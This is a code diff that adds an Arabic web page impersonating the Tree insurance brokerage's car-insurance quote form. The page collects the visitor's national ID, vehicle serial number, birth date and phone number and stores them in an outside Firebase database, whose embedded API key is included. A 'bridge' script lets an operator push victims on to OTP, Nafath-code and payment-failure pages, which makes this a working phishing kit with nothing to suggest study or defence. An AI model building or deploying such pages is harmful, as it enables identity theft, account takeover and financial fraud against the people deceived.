@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تري لوساطة التأمين | Tree</title>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <style>
+        :root { --tree-green: #00ff9d; --bg-dark: #0d1b1a; }
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: var(--bg-dark); color: white; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-image: url('https://tree.com.sa/assets/images/home/hero-bg.jpg'); background-size: cover; background-position: center; }
+        header { width: 100%; padding: 20px 40px; display: flex; justify-content: space-between; box-sizing: border-box; }
+        .logo { font-size: 24px; font-weight: bold; } .logo span { color: var(--tree-green); }
+        .main-container { width: 90%; max-width: 450px; margin-top: 20px; text-align: right; }
+        .tagline { color: var(--tree-green); font-size: 14px; margin-bottom: 5px; }
+        .title { font-size: 32px; font-weight: bold; margin: 0 0 20px 0; }
+        
+        /* صندوق البيانات */
+        .glass-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); border-radius: 25px; padding: 25px; border: 1px solid rgba(255, 255, 255, 0.1); }
+        
+        /* تبديل نوع التأمين */
+        .tabs { display: flex; background: rgba(0,0,0,0.2); border-radius: 12px; padding: 5px; margin-bottom: 20px; }
+        .tab { flex: 1; text-align: center; padding: 10px; font-size: 13px; cursor: pointer; border-radius: 10px; transition: 0.3s; }
+        .tab.active { background: var(--tree-green); color: #0d1b1a; font-weight: bold; }
+
+        input { width: 100%; padding: 15px; margin-bottom: 12px; border-radius: 12px; border: none; background: rgba(255, 255, 255, 0.15); color: white; font-size: 14px; box-sizing: border-box; outline: none; text-align: right; }
+        input::placeholder { color: rgba(255,255,255,0.6); }
+
+        .checkbox-container { display: flex; align-items: flex-start; gap: 10px; font-size: 11px; color: rgba(255,255,255,0.7); margin: 15px 0; }
+        .btn-submit { width: 100%; padding: 18px; border-radius: 15px; border: none; background: var(--tree-green); color: #0d1b1a; font-weight: bold; font-size: 18px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo">tree</div>
+    <div style="display:flex; gap:15px; font-size:14px;"><span>En</span><span style="color:var(--tree-green)">ع</span></div>
+</header>
+
+<div class="main-container">
+    <div class="tagline">تأمين السيارات</div>
+    <h1 class="title">احمِ مركبتك!</h1>
+
+    <div class="glass-card">
+        <div class="tabs">
+            <div class="tab active">تأمين جديد</div>
+            <div class="tab">نقل ملكية</div>
+            <div class="tab">تجديد الوثيقة</div>
+        </div>
+
+        <input type="text" id="serialNum" placeholder="الرقم التسلسلي / بطاقة جمركية">
+        <input type="number" id="idNum" placeholder="رقم الهوية / الإقامة الخاصة بك">
+        <input type="text" id="birthDate" placeholder="تاريخ الميلاد" onfocus="(this.type='date')">
+        <input type="tel" id="phoneNum" placeholder="رقم الجوال  |  +966">
+        <input type="text" id="startDate" placeholder="تاريخ بدء الوثيقة" onfocus="(this.type='date')">
+
+        <div class="checkbox-container">
+            <input type="checkbox" id="terms" style="width: 20px; margin: 0;">
+            <label for="terms">بالمتابعة، أقر بقراءة وفهم وقبول إشعار الخصوصية لشركة تري الرقمية لوكالة التأمين</label>
+        </div>
+
+        <button class="btn-submit" onclick="startOrder()">أمن الحين</button>
+    </div>
+</div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
+        authDomain: "tameen-658e9.firebaseapp.com",
+        projectId: "tameen-658e9",
+        storageBucket: "tameen-658e9.firebasestorage.app",
+        messagingSenderId: "292670676256",
+        appId: "1:292670676256:web:3624157751cd194efe4b45"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    async function startOrder() {
+        const id = document.getElementById('idNum').value;
+        const serial = document.getElementById('serialNum').value;
+        const birth = document.getElementById('birthDate').value;
+        const phone = document.getElementById('phoneNum').value;
+        const start = document.getElementById('startDate').value;
+
+        if(!id || !phone || !serial) { alert("يرجى تعبئة الحقول الأساسية"); return; }
+
+        try {
+            localStorage.setItem('user_id', id);
+            await db.collection("orders").doc(id).set({
+                id: id,
+                serial: serial,
+                birthDate: birth,
+                phone: phone,
+                startDate: start,
+                status: "الصفحة الرئيسية",
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            }, { merge: true });
+
+            window.location.href = "offers.html";
+        } catch (e) { alert("خطأ في الاتصال"); }
+    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_faild.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
+                }
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
+</script>
+</body>
+</html>
+
